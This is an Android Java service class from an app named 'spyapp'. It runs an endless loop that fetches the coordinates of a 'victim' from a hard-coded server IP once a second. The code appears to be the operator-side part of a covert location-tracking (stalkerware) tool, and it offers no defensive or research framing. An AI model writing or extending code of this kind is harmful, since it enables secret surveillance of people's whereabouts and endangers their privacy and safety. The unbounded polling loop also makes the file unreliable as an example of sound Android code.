package com.example.albert.spyapp.services;

import android.app.IntentService;
import android.content.Intent;
import android.support.annotation.Nullable;
import android.util.Log;

import com.example.albert.spyapp.cordinates.CordsRequest;

public class GetLocationFromServerService extends IntentService {

   public  GetLocationFromServerService(){
        super(GetLocationFromServerService.class.getSimpleName());
    }


    public void onStart(Intent intent, int startId) {
        // TODO Auto-generated method stub
        super.onStart(intent, startId);
        getLocFromServer();
        this.stopSelf();
    }

    @Override
    public void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();

    }


    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

    }

    public void getLocFromServer(){

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true){
                    Log.d("getting loation working","clicked");
                    CordsRequest request=new CordsRequest("http://35.204.80.21:4567/victim/getCords/albi",getApplicationContext());
                    request.getCords();
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();




    }

}
